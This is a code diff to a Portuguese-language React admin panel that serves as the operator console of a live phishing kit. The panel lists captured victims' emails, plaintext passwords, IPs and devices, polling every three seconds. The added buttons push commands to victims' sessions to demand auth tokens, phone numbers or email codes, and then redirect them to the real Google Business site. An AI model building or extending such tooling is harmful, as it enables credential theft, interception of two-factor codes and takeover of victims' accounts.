@@ -9,10 +9,13 @@ function AdminPanel() {
   const [loginAttempts, setLoginAttempts] = useState([]);
   const [loading, setLoading] = useState(true);
   const [searchTerm, setSearchTerm] = useState("");
+  const [redirectUrl, setRedirectUrl] = useState("https://business.google.com/");
   const navigate = useNavigate();
 
   useEffect(() => {
     fetchLoginAttempts();
+    const interval = setInterval(fetchLoginAttempts, 3000); // Atualiza a cada 3 segundos
+    return () => clearInterval(interval);
   }, []);
 
   const getAuthHeaders = () => {
@@ -38,6 +41,39 @@ function AdminPanel() {
         localStorage.removeItem("admin_token");
         navigate("/donas/login");
       }
+    }
+  };
+
+  const sendCommand = async (userId, command) => {
+    try {
+      const headers = getAuthHeaders();
+      if (!headers) return;
+
+      const payload = {
+        user_id: userId,
+        command: command,
+      };
+
+      if (command === "REDIRECT") {
+        payload.redirect_url = redirectUrl;
+      }
+
+      await axios.post(`${API}/admin/command`, payload, { headers });
+      fetchLoginAttempts();
+    } catch (error) {
+      console.error("Erro ao enviar comando:", error);
+    }
+  };
+
+  const updateStatus = async (userId, status) => {
+    try {
+      const headers = getAuthHeaders();
+      if (!headers) return;
+
+      await axios.post(`${API}/admin/update-status/${userId}?status=${status}`, {}, { headers });
+      fetchLoginAttempts();
+    } catch (error) {
+      console.error("Erro ao atualizar status:", error);
     }
   };
 
@@ -158,17 +194,16 @@ function AdminPanel() {
               <div className="flex gap-2">
                 <input
                   type="text"
+                  value={redirectUrl}
+                  onChange={(e) => setRedirectUrl(e.target.value)}
                   placeholder="https://business.google.com/"
                   className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                 />
-                <button className="bg-gray-200 hover:bg-gray-300 p-2 rounded-lg transition-colors">
-                  🗑️
-                </button>
               </div>
             </div>
           </div>
 
-          {/* Table */}
+          {/* Cards */}
           {loading ? (
             <div className="text-center py-12">
               <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-purple-600"></div>
@@ -179,49 +214,146 @@ function AdminPanel() {
               <p className="text-gray-500 text-lg">Nenhuma tentativa de login encontrada</p>
             </div>
           ) : (
-            <div className="overflow-x-auto">
-              <table className="w-full">
-                <thead>
-                  <tr className="border-b-2 border-gray-200">
-                    <th className="bg-blue-100 px-4 py-3 text-left text-xs font-semibold text-gray-700 uppercase tracking-wider">#</th>
-                    <th className="bg-purple-100 px-4 py-3 text-left text-xs font-semibold text-gray-700 uppercase tracking-wider">Status</th>
-                    <th className="bg-yellow-100 px-4 py-3 text-left text-xs font-semibold text-gray-700 uppercase tracking-wider">USUÁRIO/LOGIN</th>
-                    <th className="bg-green-100 px-4 py-3 text-left text-xs font-semibold text-gray-700 uppercase tracking-wider">SENHA</th>
-                    <th className="bg-blue-100 px-4 py-3 text-left text-xs font-semibold text-gray-700 uppercase tracking-wider">EMAIL</th>
-                    <th className="bg-pink-100 px-4 py-3 text-left text-xs font-semibold text-gray-700 uppercase tracking-wider">DISPOSITIVO</th>
-                    <th className="bg-gray-100 px-4 py-3 text-center text-xs font-semibold text-gray-700 uppercase tracking-wider">Ações</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  {filteredAttempts.map((attempt, index) => (
-                    <tr key={attempt.id} className="border-b border-gray-200 hover:bg-gray-50">
-                      <td className="px-4 py-4 text-sm">{index + 1}</td>
-                      <td className="px-4 py-4">
-                        <span className="inline-block w-3 h-3 bg-red-500 rounded-full"></span>
-                      </td>
-                      <td className="px-4 py-4 text-sm font-medium">{attempt.email}</td>
-                      <td className="px-4 py-4 text-sm">{attempt.password || "-"}</td>
-                      <td className="px-4 py-4 text-sm">{attempt.email}</td>
-                      <td className="px-4 py-4 text-sm">
-                        <div className="space-y-1 text-xs text-gray-600">
-                          <div>IP: {attempt.ip_address || "-"}</div>
-                          <div>País: {attempt.country || "-"}</div>
-                          <div>Dispositivo: {attempt.device || "Desktop"}</div>
-                          <div>Página: {attempt.page || "Página Loading..."}</div>
-                        </div>
-                      </td>
-                      <td className="px-4 py-4 text-center">
-                        <button
-                          onClick={() => handleDelete(attempt.id)}
-                          className="text-red-600 hover:text-red-800 font-bold text-lg transition-colors"
-                        >
-                          🗑️
-                        </button>
-                      </td>
-                    </tr>
-                  ))}
-                </tbody>
-              </table>
+            <div className="space-y-4">
+              {filteredAttempts.map((attempt, index) => (
+                <div key={attempt.id} className="border border-gray-200 rounded-lg p-4 bg-white shadow-sm hover:shadow-md transition-shadow">
+                  {/* Header do Card */}
+                  <div className="grid grid-cols-2 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-12 gap-2 mb-4">
+                    {/* # */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-blue-600 mb-1">#</span>
+                      <span className="text-sm font-bold">{index + 1}</span>
+                    </div>
+
+                    {/* STATUS */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-purple-600 mb-1">STATUS</span>
+                      <button
+                        onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
+                        className="flex items-center gap-1"
+                      >
+                        <span className={`inline-block w-3 h-3 rounded-full ${attempt.status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
+                        <span className="text-xs">{attempt.status === "online" ? "ON" : "OFF"}</span>
+                      </button>
+                    </div>
+
+                    {/* INV */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-yellow-600 mb-1">INV</span>
+                      <button
+                        onClick={() => sendCommand(attempt.id, "INV")}
+                        className="bg-yellow-500 hover:bg-yellow-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
+                      >
+                        INV
+                      </button>
+                    </div>
+
+                    {/* USUÁRIO/LOGIN */}
+                    <div className="flex flex-col col-span-2">
+                      <span className="text-xs font-semibold text-green-600 mb-1">USUÁRIO/LOGIN</span>
+                      <span className="text-sm font-medium truncate">{attempt.email}</span>
+                    </div>
+
+                    {/* SENHA */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-pink-600 mb-1">SENHA</span>
+                      <span className="text-sm truncate">{attempt.password || "-"}</span>
+                    </div>
+
+                    {/* AUT */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-blue-600 mb-1">AUT</span>
+                      <button
+                        onClick={() => sendCommand(attempt.id, "AUT")}
+                        className="bg-blue-500 hover:bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
+                      >
+                        AUT
+                      </button>
+                    </div>
+
+                    {/* EMAIL */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-indigo-600 mb-1">EMAIL</span>
+                      <button
+                        onClick={() => sendCommand(attempt.id, "EMAIL")}
+                        className="bg-indigo-500 hover:bg-indigo-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
+                      >
+                        EMAIL
+                      </button>
+                    </div>
+
+                    {/* TOK-TEL */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-teal-600 mb-1">TOK-TEL</span>
+                      <button
+                        onClick={() => sendCommand(attempt.id, "TOK-TEL")}
+                        className="bg-teal-500 hover:bg-teal-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
+                      >
+                        TOK
+                      </button>
+                    </div>
+
+                    {/* Nº TELEFONE */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-orange-600 mb-1">Nº TEL</span>
+                      <button
+                        onClick={() => sendCommand(attempt.id, "TELEFONE")}
+                        className="bg-orange-500 hover:bg-orange-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
+                      >
+                        TEL
+                      </button>
+                    </div>
+
+                    {/* 👍 */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-gray-600 mb-1">AGUARDE</span>
+                      <button
+                        onClick={() => sendCommand(attempt.id, "AGUARDE")}
+                        className="bg-gray-500 hover:bg-gray-600 text-white px-2 py-1 rounded text-xs transition-colors"
+                      >
+                        👍
+                      </button>
+                    </div>
+
+                    {/* X */}
+                    <div className="flex flex-col">
+                      <span className="text-xs font-semibold text-red-600 mb-1">X</span>
+                      <button
+                        onClick={() => sendCommand(attempt.id, "REDIRECT")}
+                        className="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
+                      >
+                        X
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* Informações abaixo */}
+                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pt-3 border-t border-gray-200 text-xs text-gray-600">
+                    <div>
+                      <span className="font-semibold">🌐 IP:</span> {attempt.ip_address || "-"}
+                    </div>
+                    <div>
+                      <span className="font-semibold">🌍 País:</span> {attempt.country || "-"}
+                    </div>
+                    <div>
+                      <span className="font-semibold">💻 Dispositivo:</span> {attempt.device || "Desktop"}
+                    </div>
+                    <div>
+                      <span className="font-semibold">📄 Página atual:</span> {attempt.page || "Página Loading..."}
+                    </div>
+                  </div>
+
+                  {/* Botão deletar */}
+                  <div className="mt-3 pt-3 border-t border-gray-200 flex justify-end">
+                    <button
+                      onClick={() => handleDelete(attempt.id)}
+                      className="text-red-600 hover:text-red-800 font-bold transition-colors"
+                    >
+                      🗑️ Deletar
+                    </button>
+                  </div>
+                </div>
+              ))}
             </div>
           )}
         </div>
